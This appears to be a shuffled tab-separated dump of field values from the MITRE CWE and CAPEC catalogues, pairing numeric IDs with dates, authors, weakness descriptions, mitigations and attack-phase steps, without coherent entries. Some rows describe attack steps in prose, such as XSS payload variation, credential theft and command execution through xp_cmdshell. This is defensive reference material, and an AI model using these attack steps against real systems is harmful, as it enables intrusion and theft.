17955	66	Writing Secure Code
23432	95	[Craft and inject the payload] Develop the payload to be executed in the higher privileged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.
9405	62	updated Relationships, Other_Notes, Taxonomy_Mappings
7438	28	CWE Content Team
16564	24	MITRE
25225	39	2019-01-03
8086	26	Implementation
9088	43	Simple
7971	56	ChildOf
6617	28	CWE Content Team
19131	39	2008-07-01
22718	84	25
19615	25	Medium
9203	69	Draft
21557	89	Detailed
22996	39	2009-03-10
20476	95	[Attempt injection payload variations on input parameters] Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. The payloads are designed to bypass incomplete filtering (e.g., incomplete HTML encoding etc.) and tries many variations of characters injection that would enable the XSS payload. He records all the responses from the server that include unmodified versions of his script.
18563	39	2011-06-01
11543	35	MITRE
7786	100	The MITRE Corporation
9977	39	2011-06-01
12792	28	CWE Content Team
12456	24	MITRE
14701	35	MITRE
14072	35	Cigital
11314	66	SSRF vs. Business-critical applications: XXE tunneling in SAP
13073	23	Any condition where the attacker has the ability to write an arbitrary value to an arbitrary location, often as the result of a buffer overflow.
5619	35	MITRE
6976	28	CWE Content Team
25400	21	CLASP
13430	39	2009-10-29
16398	57	Primary
7530	35	MITRE
6808	81	Integrity
10156	103	Primary
20046	21	CWE Content Team
7025	79	Confidentiality
8457	23	Sensitive memory is cleared according to the source code, but compiler optimizations leave the memory untouched when it is not read from again, aka "dead store removal."
6874	79	Confidentiality
19370	39	2017-05-03
14583	39	2008-07-01
15827	69	Draft
14584	48	10
16471	91	Implementation
21776	39	2008-09-08
16518	59	Updated Attack_Phases, Examples-Instances
10352	62	updated Common_Consequences
19667	63	Execute Unauthorized Code or Commands
13987	44	High
10894	26	Implementation
22853	28	CWE Content Team
11914	91	Implementation
12071	74	3
8588	35	MITRE
10939	21	PLOVER
22530	76	2018-07-31
18794	31	699
13894	31	1000
6652	104	1086
16235	89	Standard
9739	39	2014-06-23
18646	39	2008-09-08
22455	56	ChildOf
8051	97	Cause Web Server Misclassification
7749	46	Incomplete filtering of this nature may be applied to:                                                sequential elements (special elements that appear next to each other) or                   non-sequential elements (special elements that appear multiple times in different locations).
15488	103	Primary
11992	62	updated Relationships
12720	45	Class
18990	39	2012-05-11
16887	31	1000
22165	62	updated Relationships
17401	85	127
23415	39	2014-07-30
20760	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
23238	39	2011-09-13
17227	44	SOAR Partial
8633	51	2014-06-23
23241	62	Expanded entry to be more general and include all types of Android components that may be improperly exported.
8590	56	ChildOf
12410	44	Limited
14768	35	MITRE
21324	81	Other
24572	61	Draft
12197	35	MITRE
15758	62	updated Relationships
9146	35	MITRE
10089	88	Improper Resolution of Path Equivalence
9439	35	MITRE
8740	39	2014-07-30
14797	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19049	81	Availability
12338	91	Requirements
18278	72	An attacker can access any functionality that is inadvertently accessible to the source.
13392	26	Operation
16499	104	459
11699	35	MITRE
9340	86	http://msdn.microsoft.com/en-us/library/aa374735(VS.85).aspx
18350	69	Incomplete
20045	89	Detailed
11406	56	ChildOf
16240	26	Implementation
19273	23	An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.
25134	62	updated Description, Modes_of_Introduction, Other_Notes, Potential_Mitigations
14323	33	Timothy N. Newsham
11214	45	Base
14011	89	Detailed
12266	31	1000
17729	59	Updated Examples-Instances, Related_Attack_Patterns, Typical_Likelihood_of_Exploit
18802	103	Primary
9924	76	2019-04-04
12708	39	2011-06-01
11290	31	699
13043	42	Use the "double-submitted cookie" method as described by Felten and Zeller:                   When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.                   Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.                   This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]
17142	31	1000
13840	39	2010-04-05
8516	39	2015-12-07
14727	28	CWE Content Team
12757	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the types of things that the target likes.
12595	90	Language-Independent
11017	68	Note that this can be bypassed using XSS (CWE-79).
15903	46	If a Struts Action Form Mapping specifies a form, it must have a validation form defined under the Struts Validator.
12730	31	1000
24131	62	Added demonstrative example for profile.
23476	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
15579	28	Eric Dalci
16346	39	2017-11-08
18587	45	Base
8223	66	Mobile App Top 10 List
6452	25	Medium
6531	26	Implementation
20302	28	CWE Content Team
23457	81	Non-Repudiation
25259	103	Primary
16348	81	Availability
10273	97	Force the System to Reset Values
9490	28	Eric Dalci
11648	43	Simple
12662	31	1000
21939	101	CAPEC Content Team
16586	28	CWE Content Team
6684	62	updated Potential_Mitigations
22282	35	MITRE
25293	23	This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. A typical example is file access. The adversary can leverage a file access race condition by "running the race", meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary could replace or modify the file, causing the application to behave unexpectedly.
14766	70	UTF-8 and Unicode FAQ for Unix/Linux
17714	102	ChildOf
7945	39	2008-10-14
14718	56	ChildOf
11757	28	CWE Content Team
8133	101	CAPEC Content Team
13261	45	Base
7073	62	updated Common_Consequences
18266	39	2009-03-10
16137	28	CWE Content Team
11931	22	12
11462	103	Primary
15819	62	updated Taxonomy_Mappings
15917	57	Primary
16225	45	Class
6267	35	MITRE
20764	56	ChildOf
22872	31	1000
13330	62	updated Common_Consequences
12160	85	147
20436	79	Availability
12786	73	Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)
15120	21	PLOVER
16151	50	Authenticating both services and their discovery, and protecting that authentication mechanism simply fixes the bulk of this problem. Protecting the authentication involves the standard means, including: 1) protecting the channel over which authentication occurs, 2) preventing the theft, forgery, or prediction of authentication credentials or the resultant tokens, or 3) subversion of password reset and the like.
18835	103	Primary
18869	35	MITRE
15980	66	Dynamic File Uploads, Security and You
10578	39	2008-09-08
10936	28	CWE Content Team
17028	28	CWE Content Team
10259	35	Cigital
15563	39	2008-09-08
5918	51	2014-06-23
14145	73	Research popular or high traffic websites.
16143	25	Low
17751	28	CWE Content Team
15862	28	CWE Content Team
12768	35	MITRE
22265	63	Read Files or Directories
6278	66	SQL Injection
15495	62	updated Applicable_Platforms, Description, Relationship_Notes
16475	21	PLOVER
19332	28	CWE Content Team
17864	35	Cigital
11577	56	ChildOf
21752	42	Encrypt the data with a reliable encryption scheme before transmitting.
10175	103	Primary
5754	23	Certain conditions, such as network failure, will cause a server error message to be displayed.
25285	99	Adobe
20045	61	Draft
11904	102	ChildOf
13022	28	CWE Content Team
16984	39	2012-05-11
19641	28	CWE Content Team
18364	91	Architecture and Design
16785	62	updated Relationships
13815	42	Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).
17100	85	98
24234	97	Embedding NULL Bytes
23869	28	CWE Content Team
23672	39	2008-07-01
10738	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
12723	35	Veracode
11550	63	Modify Application Data
10948	54	High
24799	79	Availability
23430	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
17518	35	MITRE
16261	47	Unreliable Execution
16596	39	2010-12-13
18090	28	CWE Content Team
8893	46	This can cause the software to consume all available file descriptors or handles, which can prevent other processes from performing critical file processing operations.
25093	59	Updated Activation_Zone, Attack_Phases, Description, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
16275	35	MITRE
6947	58	Regular expressions are typically used to match a pattern of text. Anchors are used in regular expressions to specify where the pattern should match: at the beginning, the end, or both (the whole input).
5954	31	1000
11742	28	CWE Content Team
20780	92	Exploit
20054	63	Execute Unauthorized Code or Commands
14056	85	596
11579	50	Design: Configure the access control correctly.
16388	28	CWE Content Team
15490	54	High
21445	35	MITRE
23127	62	updated Description
8954	35	MITRE
15887	62	updated Other_Notes
19049	63	Execute Unauthorized Code or Commands
9329	86	http://blog.bdoughan.com/2011/03/preventing-entity-expansion-attacks-in.html
9600	56	CanPrecede
17686	22	06
13462	31	1003
8906	89	Detailed
16746	81	Integrity
16748	92	Explore
23486	39	2011-06-01
11322	62	updated Common_Consequences
18822	39	2008-11-24
11639	28	CWE Content Team
8400	39	2008-09-08
13428	28	CWE Content Team
9337	21	CWE Content Team
5677	35	MITRE
11027	100	The MITRE Corporation
24601	70	Cross-Site Tracing (XST)
9378	31	1000
13621	92	Explore
19455	35	MITRE
20498	26	Implementation
21402	28	CWE Content Team
23268	39	2012-05-11
22778	63	Gain Privileges or Assume Identity
16578	28	CWE Content Team
11705	62	updated Relationships
23529	28	CWE Content Team
5615	56	ChildOf
18847	43	Simple
25044	62	updated Potential_Mitigations
14374	66	Top 25 Series - Rank 11 - Hardcoded Credentials
5770	23	In C and C++, one may often accidentally refer to the wrong memory due to the semantics of when math operations are implicitly scaled.
25058	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
10605	28	CWE Content Team
24147	96	2008-01-30
17371	35	MITRE
19231	39	2009-03-10
8169	35	MITRE
22561	62	updated Observed_Examples, Relationships
19745	63	Other
19077	39	2019-06-20
19699	86	http://www.whitehatsec.com/home/solutions/BL_auction.html
11115	28	CWE Content Team
18350	88	Use of Non-Canonical URL Paths for Authorization Decisions
11927	62	updated Potential_Mitigations
19013	101	CAPEC Content Team
7614	97	XML Injection
9687	57	Primary
13864	31	1000
11807	63	Reduce Maintainability
21035	62	updated Time_of_Introduction
18222	47	Gain Privileges
14978	31	699
9329	66	Preventing Entity Expansion Attacks in JAXB
18150	92	Experiment
7067	35	KDM Analytics
25278	67	Medium
15078	28	CWE Content Team
9902	85	516
8650	81	Other
20865	100	The MITRE Corporation
9658	77	Manual Analysis
18101	62	updated Demonstrative_Examples
20268	28	CWE Content Team
24770	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Likelihood_of_Exploit, Name, Potential_Mitigations, References, Relationships
19707	103	Primary
18502	35	MITRE
24378	63	Bypass Protection Mechanism
23165	31	1003
8584	100	The MITRE Corporation
15372	35	MITRE
13593	62	updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, Relationships, Taxonomy_Mappings
20591	81	Integrity
24429	62	updated Relationships
18267	59	Updated Description Summary
20258	83	3rd "Zero Day" Edition,
24694	35	MITRE
8883	80	To achieve a redirection and use of less trusted source, an attacker can simply edit data that the host uses to build the filename
13245	61	Draft
12881	56	ChildOf
22828	39	2010-09-27
13635	70	Exploiting Software: How to Break Code
23083	44	SOAR Partial
9558	28	CWE Content Team
24440	43	Simple
14310	104	1116
10163	39	2018-03-27
11985	95	[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.
22940	23	The software does not validate or incorrectly validates the integrity check values or "checksums" of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission.
15946	62	updated Relationships, Taxonomy_Mappings
23082	35	MITRE
25003	76	2019-09-30
8372	35	MITRE
16797	104	1176
18875	28	CWE Content Team
10657	35	Cigital
6281	50	Potential mitigations include requiring a unique login for each resource request, constraining local unprivileged access by disallowing simultaneous engagements of the resource, or limiting access to the resource to one access per IP address. In such scenarios, the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses.
7162	89	Detailed
20670	35	MITRE
8326	63	Read Application Data
25407	35	MITRE
13403	91	Implementation
19988	103	Primary
18416	42	Ensure that proper authentication is included in the system design.
15146	92	Experiment
21049	50	Ensure that proper, physical system access is regulated to prevent an adversary from physically connecting a malicious USB device himself.
9900	35	MITRE
24581	28	CWE Content Team
8294	103	Primary
8972	59	Updated Related_Attack_Patterns, Taxonomy_Mappings
12769	46	When a developer wants to initialize, use or release a resource, it is important to follow the specifications outlined for how to operate on that resource and to ensure that the resource is in the expected state. In this case, the software wants to perform a normally valid operation, initialization, use or release, on a resource when it is in the incorrect phase of its lifetime.
6100	73	Attempt to create accounts if possible; system should indicate if a user ID is already taken.
11692	95	[Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive] The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive.
17366	79	Authorization
14351	39	2012-05-11
22464	39	2012-05-11
14475	62	updated Applicable_Platforms, Demonstrative_Examples, Name
12136	28	CWE Content Team
19198	28	CWE Content Team
13532	25	High
19221	51	2014-06-23
23504	62	updated Relationships, Taxonomy_Mappings
24074	39	2008-09-08
21625	59	Updated Related_Attack_Patterns
11744	35	MITRE
20619	88	Insufficient Visual Distinction of Homoglyphs Presented to User
11782	63	Varies by Context
10705	62	updated Other_Notes
21172	97	Rogue Integration Procedures
13118	56	ChildOf
18445	77	Automated Static Analysis - Binary or Bytecode
7389	76	2019-04-04
11634	80	The attacker can naively try backslash character and discover that the target host uses it as escape character.
19934	42	Where non-reentrant functionality must be leveraged within a signal handler, be sure to block or mask signals appropriately. This includes blocking other signals within the signal handler itself that may also leverage the functionality. It also includes blocking all signals reliant upon the functionality when it is being accessed or modified by the normal behaviors of the software.
23810	35	MITRE
22497	53	The MITRE Corporation
18263	62	updated Relationships
14302	26	Implementation
9113	35	MITRE
17868	43	Simple
23923	35	MITRE
18049	39	2009-05-27
13473	23	The software does not handle or incorrectly handles when it has insufficient privileges to perform an operation, leading to resultant weaknesses.
15084	57	Primary
11007	39	2008-07-01
19014	39	2011-09-13
18261	39	2014-07-30
8453	35	MITRE
6191	62	updated Relationships, Taxonomy_Mappings
14679	47	Execute Unauthorized Commands
13061	28	CWE Content Team
10318	63	Modify Memory
24291	31	699
19946	35	MITRE
15130	35	MITRE
24586	39	2013-07-17
10965	62	updated Relationships, Taxonomy_Mappings
19730	39	2008-09-08
23623	28	CWE Content Team
24215	91	Implementation
10032	62	updated Relationships
22915	35	MITRE
13323	78	Medium
19200	35	MITRE
7723	102	ChildOf
15720	103	Primary
22033	62	updated Description
8655	104	248
8352	28	CWE Content Team
13806	39	2017-11-08
21034	91	Implementation
10765	79	Authorization
9279	39	2008-07-01
11688	54	Medium
11062	77	Automated Analysis
11518	62	updated Detection_Factors, Potential_Mitigations
10113	62	updated Common_Consequences
16795	43	Simple
16372	91	Implementation
9731	31	699
21084	39	2008-09-08
19846	56	ChildOf
10549	51	2014-06-23
23062	42	Consider adhering to the following rules when allocating and managing an application's memory:                                                                  Double check that your buffer is as large as you specify.                         When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.                         Check buffer boundaries if accessing the buffer in a loop and make sure you are not in danger of writing past the allocated space.                         If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.
16225	88	Improper Filtering of Special Elements
20643	81	Availability
22571	55	CAPEC Content Team
10696	85	20
18774	97	Black Box Reverse Engineering
9009	91	Implementation
16853	39	2014-07-30
9822	42	In Windows, make sure that the process token has the SeImpersonatePrivilege(Microsoft Server 2003). Code that relies on impersonation for security must ensure that the impersonation succeeded, i.e., that a proper privilege demotion happened.
17836	62	updated Applicable_Platforms, Related_Attack_Patterns
13794	35	Veracode
23672	35	Cigital
18441	26	Implementation
7838	50	Known vulnerabilities in DNS or router software or in operating systems must be patched as soon as a fix has been released and tested.
20428	77	Manual Analysis
6912	89	Detailed
7825	97	Target Influence via The Human Buffer Overflow
6894	28	CWE Content Team
11761	62	updated Description, Name
11521	91	Implementation
11632	62	updated Potential_Mitigations, Time_of_Introduction
16043	70	Regular Expression Denial of Service Attacks and Defenses
17126	35	MITRE
14149	28	CWE Content Team
21934	79	Availability
21668	39	2011-06-01
10439	39	2019-01-03
11957	56	ChildOf
8553	79	Integrity
19255	73	Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.
19047	43	Simple
14746	24	MITRE
21117	28	CWE Content Team
9927	26	Implementation
19379	39	2012-05-11
24912	25	Low
15506	101	CAPEC Content Team
18793	85	176
21477	35	MITRE
24381	63	Modify Application Data
18590	28	CWE Content Team
6737	35	MITRE
8957	28	CWE Content Team
9662	89	Detailed
11028	45	Class
8099	35	MITRE
18522	40	The victim is communicating with the target application via a web based UI and not a thick client
17980	35	MITRE
15632	62	updated Relationships
11470	35	MITRE
20724	33	Johnny Shelley
15991	62	updated Common_Consequences
21550	62	updated Description, Other_Notes, Relationship_Notes, Time_of_Introduction
16934	66	Null pointer / Null dereferencing
11387	39	2017-05-03
19071	50	Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead
6141	102	ChildOf
7314	31	699
16290	35	MITRE
17383	89	Standard
9276	81	Integrity
7828	28	CWE Content Team
18347	56	ChildOf
15662	81	Availability
10283	78	Medium
20475	62	updated Potential_Mitigations
12446	31	699
5592	72	If the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory.
8407	88	Improper Control of Generation of Code ('Code Injection')
16850	66	XSS (Cross Site Scripting) Cheat Sheet
6425	28	CWE Content Team
7655	56	PeerOf
23675	35	MITRE
12696	39	2014-07-30
23911	63	Unexpected State
17884	30	Ryan Naraine
20348	39	2010-06-21
18444	103	Primary
12718	61	Draft
22143	39	2017-11-08
10632	35	MITRE
12915	28	CWE Content Team
8217	63	Unexpected State
23495	35	MITRE
9958	35	MITRE
23544	28	Eric Dalci
6697	90	Assembly
7850	35	MITRE
9072	47	Read Data
16264	21	Pascal Meunier
18207	35	MITRE
25133	56	ChildOf
24119	28	Eric Dalci
14566	23	The software does not properly handle when a particular element is not completely specified.
20444	52	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.
10735	56	ChildOf
6195	31	699
17486	35	MITRE
8891	90	C++
11666	88	Improper Authentication
18786	33	Sascha Fahl, Marian Harbach, Thomas Muders, Matthew Smith
15162	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Permission Manifest Analysis
19259	35	MITRE
18775	39	2014-07-30
17873	35	MITRE
20612	63	Read Memory
18308	39	2011-06-27
10296	35	Cigital
20881	26	Implementation
20835	39	2010-06-21
23488	28	Eric Dalci
9045	35	MITRE
7480	89	Detailed
14467	45	Base
14259	72	By bypassing the security mechanism, a user might leave the system in a less secure state than intended by the administrator, making it more susceptible to compromise.
9405	35	MITRE
24833	62	updated Common_Consequences
9571	88	Improper Handling of Apple HFS+ Alternate Data Stream Path
7947	62	updated References, Relationships
15049	39	2010-06-21
12339	104	463
23475	33	Stefano Di Paola
18290	101	CAPEC Content Team
24920	62	updated Common_Consequences
12547	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
24156	39	2011-03-29
24056	39	2010-04-05
24122	46	Within XML, special elements could include reserved words or characters such as "<", ">", """, and "&", which could then be used to add new data or modify XML syntax.
14342	35	MITRE
24340	59	Updated Related_Attack_Patterns
14187	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
8822	39	2014-02-18
24966	28	CWE Content Team
24393	39	2017-11-08
18101	28	CWE Content Team
11006	35	MITRE
13969	39	2012-05-11
25270	35	MITRE
24564	28	CWE Content Team
8291	81	Confidentiality
6197	96	2019-01-02
24959	69	Incomplete
5890	59	Updated Related_Weaknesses
6362	28	CWE Content Team
12806	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
9693	28	CWE Content Team
14291	77	Automated Static Analysis
8118	43	Simple
13513	45	Base
6394	88	J2EE Misconfiguration: Data Transmission Without Encryption
20833	91	Implementation
22316	104	35
17805	39	2014-07-30
8344	80	Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.
17321	85	219
16047	91	Implementation
8110	35	MITRE
14471	86	http://svn.apache.org/repos/asf/cxf/trunk/security/CVE-2010-2076.pdf
10459	61	Draft
22132	63	Unexpected State
15795	62	updated Common_Consequences, Modes_of_Introduction
25340	28	CWE Content Team
12855	43	Simple
15700	53	The MITRE Corporation
7726	86	http://kaizo.org/mirrors/phrack/phrack55/P55-08
23857	35	MITRE
13984	33	Craig A. Shue
24172	62	updated Common_Consequences
6681	39	2019-06-20
6463	59	Updated Related_Attack_Patterns, Resources_Required
24299	103	Primary
19088	39	2011-06-01
12439	23	The software calls a function, procedure, or routine, but the caller specifies the arguments in an incorrect order, leading to resultant weaknesses.
21242	53	The MITRE Corporation
9181	35	MITRE
6628	39	2012-05-11
15364	35	MITRE
21870	39	2018-03-27
23018	51	2014-06-23
23894	51	2014-06-23
8092	35	MITRE
5800	54	Low
19109	23	The software does not properly verify that the source of data or communication is valid.
8484	39	2012-05-11
18350	46	If an application defines policy namespaces and makes authorization decisions based on the URL, but it does not require or convert to a canonical URL before making the authorization decision, then it opens the application to attack. For example, if the application only wants to allow access to http://www.example.com/mypage, then the attacker might be able to bypass this restriction using equivalent URLs such as:                                                http://WWW.EXAMPLE.COM/mypage                   http://www.example.com/%6Dypage (alternate encoding)                   http://192.168.1.1/mypage (IP address)                   http://www.example.com/mypage/ (trailing /)                   http://www.example.com:80/mypage                                          Therefore it is important to specify access control policy that is based on the path information in some canonical form with all alternate encodings rejected (which can be accomplished by a default deny rule).
22896	23	If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.
22410	81	Other
15303	39	2012-05-11
24712	39	2017-11-08
24394	93	High
22632	39	2017-01-19
17341	35	Cigital
19372	28	CWE Content Team
22502	56	CanPrecede
12914	101	CAPEC Content Team
10214	77	Architecture or Design Review
14817	39	2019-06-20
10805	90	Java
8323	28	CWE Content Team
9953	25	High
9128	62	updated Relationships
18039	39	2017-11-08
14288	69	Draft
19499	35	MITRE
23903	39	2011-06-01
17341	39	2008-07-01
11998	61	Draft
9294	45	Base
17407	90	C#
21848	63	Gain Privileges or Assume Identity
21642	43	Simple
6247	80	The adversary uses a third-party tool to obtain the necessary tickets to execute the attack.
18770	28	Eric Dalci
20612	81	Other
24600	102	CanFollow
15381	63	Read Application Data
16754	70	WASC Threat Classification 2.0
18512	35	MITRE
24775	91	Implementation
8362	35	MITRE
15007	60	05
6215	39	2008-08-15
15050	85	228
15381	72	When a resource containing sensitive information is not correctly shutdown, it may expose the sensitive data in a subsequent allocation.
9832	39	2012-10-30
7612	23	When an operating system starts, it also starts programs called services or daemons. Modifying existing services may break existing services or may enable services that are disabled/not commonly used.
6326	44	High
10810	81	Availability
24096	35	MITRE
6019	39	2009-07-27
13323	50	There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).
6954	71	2009
10730	52	Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.                   Attach the monitor to the process and perform a login. Using disassembled code, look at the associated instructions and see if any of them appear to be comparing the input to a fixed string or value.
22169	73	Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.
7222	35	MITRE
10538	47	Modify Data
12274	56	ChildOf
8006	73	Use spidering software to get copy of web pages on legitimate site.
7378	35	Cigital
15425	33	Jeremiah Grossman
20254	32	The Open Web Application Security Project (OWASP)
8255	62	updated Common_Consequences, Description, Other_Notes
25213	35	MITRE
8972	101	CAPEC Content Team
21370	62	updated Relationships, Other_Notes, Taxonomy_Mappings
9090	62	updated Relationships, Other_Notes, Taxonomy_Mappings
14116	39	2008-09-08
21623	35	MITRE
14116	35	MITRE
12257	63	Quality Degradation
11327	39	2011-06-01
19624	47	Alter Execution Logic
18514	62	updated Description
22379	21	Anonymous Tool Vendor (under NDA)
9027	23	An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.
15077	53	The MITRE Corporation
22742	39	2008-10-13
10317	79	Authorization
11564	62	updated Relationships
11895	28	CWE Content Team
21338	56	ChildOf
16572	39	2018-03-27
7893	28	Eric Dalci
10664	62	updated Relationships
11407	24	MITRE
24541	76	2017-05-01
8291	63	Varies by Context
23857	39	2014-07-30
10497	28	CWE Content Team
19069	39	2015-12-07
9605	39	2014-07-30
15573	62	updated Potential_Mitigations
24410	35	MITRE
21904	39	2009-12-28
21221	73	Modify order of parameters/tokens
6326	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
6886	84	11
14262	42	Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.                   Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64].
14314	51	2014-06-23
7041	35	MITRE
18970	60	14
8917	56	ChildOf
18080	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Typical_Likelihood_of_Exploit, Typical_Severity
23557	35	MITRE
18210	43	Composite
14694	35	MITRE
17064	39	2008-09-08
5599	35	MITRE
13657	26	Implementation
8215	39	2012-05-11
18534	39	2015-12-07
6549	62	added/updated demonstrative examples
22264	28	CWE Content Team
21009	31	1003
21903	35	Cigital
17963	100	The MITRE Corporation
20921	62	updated Relationships
22775	62	updated References, Taxonomy_Mappings
7525	85	318
8404	76	2015-12-07
10661	35	MITRE
15805	39	2011-06-01
19109	57	Resultant
24144	28	CWE Content Team
13719	28	CWE Content Team
12483	35	MITRE
12317	50	Monitor cellular RF interface to detect the usage of weaker-than-expected cellular encryption.
24605	42	If you do make your classes clonable, ensure that your clone method is final and throw super.clone().
20160	81	Integrity
18465	42	The best way to prevent this weakness during implementation is to avoid any bugs that could trigger the external error message. This typically happens when the program encounters fatal errors, such as a divide-by-zero. You will not always be able to control the use of error pages, and you might not be using a language that handles exceptions.
16021	97	Stored XSS
12104	72	Data from an untrusted (and possibly malicious) source may be integrated.
25323	28	CWE Content Team
12291	35	MITRE
7403	39	2009-12-28
10151	103	Primary
22268	92	Experiment
6301	39	2011-06-01
17292	23	A product performs a series of non-atomic actions to switch between contexts that cross privilege or other security boundaries, but a race condition allows an attacker to modify or misrepresent the product's behavior during the switch.
8640	35	MITRE
18224	35	MITRE
22306	56	ChildOf
15309	71	1985
21103	94	Attackers can modify objects or data that was assumed to be safe from modification.
7382	59	Updated Attack_Phases
20464	31	699
16543	104	365
14751	35	MITRE
11213	39	2009-07-27
25372	81	Confidentiality
20606	28	Eric Dalci
14579	66	Fortify Descriptions
6706	91	Architecture and Design
15685	39	2019-01-03
10039	63	Bypass Protection Mechanism
8031	81	Availability
24915	62	updated Applicable_Platforms, Name, Relationships
21126	90	Language-Independent
9033	28	CWE Content Team
17392	39	2009-12-28
16624	89	Detailed
21878	23	An invokable code block contains an exception handling block      that does not contain any code, i.e. is empty.
20510	47	Hide Activities
23497	39	2014-07-30
22210	28	CWE Content Team
19008	100	The MITRE Corporation
23059	31	1000
10640	74	5
14617	39	2017-11-08
17058	77	Manual Static Analysis - Source Code
19322	77	Manual Static Analysis - Binary or Bytecode
20254	70	OWASP Testing Guide
10983	62	updated References
14369	28	CWE Content Team
8274	63	Read Memory
